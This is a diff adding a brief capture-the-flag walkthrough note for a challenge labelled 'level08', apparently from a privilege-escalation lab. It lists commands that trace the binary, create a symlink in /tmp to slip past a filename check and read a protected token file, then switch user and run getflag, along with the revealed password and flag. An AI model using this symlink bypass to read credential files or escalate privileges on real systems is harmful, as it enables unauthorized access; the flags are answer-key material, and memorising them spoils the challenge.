@@ -1,0 +1,10 @@
+LEVEL08
+ls
+-> level08 token
+ltrace ./level08
+ln -s /home/user/level08/token /tmp/flag08
+./level08 /tmp/flag08
+-> quif5eloekouj29ke0vouxean
+su flag08 -> quif5eloekouj29ke0vouxean
+getflag
+token : 25749xKZ8L7DkSCwJkT9dyv6f
